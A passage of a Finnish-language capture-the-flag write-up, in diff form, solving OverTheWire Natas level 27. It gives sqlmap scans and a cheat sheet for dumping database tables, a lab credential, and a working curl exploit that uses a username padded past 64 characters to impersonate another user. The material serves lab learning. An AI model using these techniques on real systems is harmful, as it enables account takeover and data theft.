@@ -179,14 +179,186 @@ Kun taas käytät dumpData()-funktiota, joka hakee tietoja pelkän käyttäjäni
 - `mysql_real_escape_string()` - estää injektiot, mutta ei loogisia virheitä.
 - Käyttämällä yli 64 merkkiä pitkää käyttäjänimeä, joka alkaa natas28, voit huijata järjestelmää dumpaamaan toisen käyttäjän tietoja.
 
+---
 
+## testejä
+
+Tässä loin (admin:admin) tunnuksensa ja kirjauttumisella, että onnistui ja pitihän se testat toimiiko ja ensimmäiset testit.
 
 ![alt text](./kuvat-level22-28/natas27-3.png)
 ![alt text](./kuvat-level22-28/natas27-4.png)
+
+Koodin tarkistuksensa kuitenkin ideana syöttäisi **natas28** - perässä jotakin arvoja joka täsmentyy tietokannan **VARCHAR (64)** merkintään niin pitkä AAA...~~ jotakin ja salasana saa keksiä suoraan päästä just (test) - joka on helpp muisti pelisääntö
+
 ![alt text](./kuvat-level22-28/natas27-5.png)
 ![alt text](./kuvat-level22-28/natas27-6.png)
+
+
+Tässä (go away hacker) - tarkoitta kokeilin ihan normi tunnuksella (natas28: <randompassword>) - niin enterin jälkeen se antoi tällaisen koska se ei päästä helpolla. 
+
 ![alt text](./kuvat-level22-28/natas27-7.png)
+
+Tämä on sama kuin aikaisempi, just mutta kokeiltua ideana syöttäisi **natas28** ja perässä jotakin sanaa pitkä AAAA ja kokeilin kirjauttumisen testin
+
 ![alt text](./kuvat-level22-28/natas27-8.png)
+
+--
+
+## Kali linux - chekkausta
+
+natas27 ; u3RRffXjysjgwFU6b9xa23i6prmUsYne 
+
+Eli koodin tarkistuksensa ja tuosta päättyessä antoikin vihjeitä, mutta nyt testataan kali linux ympäristön vuoro tarkistaa tämän harjoitus level.
+
+Kokeillaan sqlmap - että mitä se tarjoaa ja onkin pieni sql injektio osuus. Huomoina sqlmap ei pysty automaattisesti hyödyntämään tätä tiettyä haavoittuvuutta (looginen bugi, ei injektio), koska se ei ymmärrä tietokannan kenttärajojen aiheuttamia leikkauksia tai autentikoinnin logiikkaa. Tässä ei ole SQL-injektiota.
+
+
+Tuloksesta ei antanut mitään mutta jotakin ainakin.. testastiin varmuuden vuoksi ja hyvä harjoituksen testaus
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas27.natas.labs.overthewire.org/" --auth-type=Basic --auth-cred="natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne" --batch --risk=3 --level=5
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.8.5#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:26:14 /2025-08-08/
+
+[19:26:16] [INFO] testing connection to the target URL
+[19:26:16] [INFO] checking if the target is protected by some kind of WAF/IPS
+[19:26:17] [INFO] testing if the target URL content is stable
+[19:26:17] [INFO] target URL content is stable
+[19:26:17] [INFO] testing if parameter 'User-Agent' is dynamic
+[19:26:17] [WARNING] parameter 'User-Agent' does not appear to be dynamic
+[19:26:17] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
+[19:26:17] [INFO] testing for SQL injection on parameter 'User-Agent'
+......
+.........
+...........
+[19:41:34] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[19:41:41] [INFO] testing 'Generic inline queries'
+[19:41:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[19:41:56] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
+[19:42:10] [WARNING] parameter 'Host' does not seem to be injectable
+[19:42:10] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+[19:42:10] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 19:42:10 /2025-08-08/
+```
+
+Pientä curl testausta ja normi checkausta:
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -I -H "Referer: http://natas28.natas.labs.overthewire.org/" -u "natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne" http://natas27.natas.labs.overthewire.org/
+HTTP/1.1 200 OK
+Date: Fri, 08 Aug 2025 16:44:43 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Content-Type: text/html; charset=UTF-8
+
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne \
+-d "username=test&password=test" \
+http://natas27.natas.labs.overthewire.org/
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
+<body>
+<h1>natas27</h1>
+<div id="content">
+User test was created!<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+**LISÄTIETOA:**
+Haettu netistä lisätietoa ja apua, mutta tämä on tekoälyn apua. Tämä komento lähettää POST pyynnön ja tekee sellaisen arvauksensa.
+
+Sovellus ei tarkistanut onko "samanniminen" käyttäjä jo olemassa, koska käyttäjänimi ei ole UNIQUE. Koska se käyttää VARCHAR(64) kenttää, MySQL leikkaa käyttäjänimen automaattisesti 64 merkkiin. Tuloksena on toinen käyttäjä, jonka truncattu käyttäjänimi on täsmälleen natas28, eli täsmää olemassa olevaan oikeaan käyttäjään.
+
+
+Lyhyesti sanottuna on logiikkavirhe, ei SQL injektio ja onkin hyödyntämistä käyttäytymistä.
+
+1. Lähetit lomakkeeseen yli 64-merkkisen käyttäjänimen, joka alkaa natas28.
+2. MySQL katkaisi nimen 64 merkkiin, jolloin siitä tuli vain natas28, sama kuin olemassa oleva käyttäjä.
+3. Koska käyttäjänimet eivät ole uniikkeja, tietokantaan lisättiin toinen natas28.
+4. Nyt voit kirjautua sisään omalla salasanallasi käyttäen nimeä natas28.
+5. Sovellus näyttää sinulle tiedot (ja salasanan) oikealta natas28-käyttäjältä, koska se ei tarkista salasanaa kunnolla.
+
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne \
+-d "username=natas28$(python3 -c 'print("A"*100)')" \
+-d "password=abc123" \
+http://natas27.natas.labs.overthewire.org/
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
+<body>
+<h1>natas27</h1>
+<div id="content">
+User natas28AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA was created!<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+
+Tämä osuus on kuin pieni sqlmap **sql injektion** lunttilappu osuus jos mikäli haluttaisiin tarkistaa toi natas27:sen tietokannan olemassaolon ja jos on niin mitä seuraavaksi pitäisi tehdä ja saada selville. 
+
+```
+testausta löytyykö injketiopiste
+
+sqlmap -u "http://natas27.natas.labs.overthewire.org/" \
+--auth-type Basic --auth-cred "natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne" \
+--data "username=test&password=test" \
+--batch --level=1 --risk=1 --identify-waf
+
+
+- jos injkeito löytyy niin lisätään tietokanna nimen: --dbs
+- jos tietokanta löytyy sitten lisätään perään: --tables -D <tietokannan_nimi>
+- ja viimeisenä dumppaus ulos jos löytyy ja lisätään perään: --dump -D <tietokanta> -T users
+```
+
+
+
+
+
+
+
+
+## virallinen onnistuminen
+
+Muutama testauksen jälkeen jouduin tarkistaa Youtube:stä miten ne on testattu, ja vertailtu muiden bloggien julkaisua, mutta sitten alkoi toimia ja se on ihme kyllä. Aikaisempien toisten ohjeita saattoi olla yli vuoden-pari-muutaman vuoden vanhoja.
+
 ![alt text](./kuvat-level22-28/natas27-9.png)
 ![alt text](./kuvat-level22-28/natas27-10.png)
 ![alt text](./kuvat-level22-28/natas27-11.png)
+
+
+
+
+
+
+
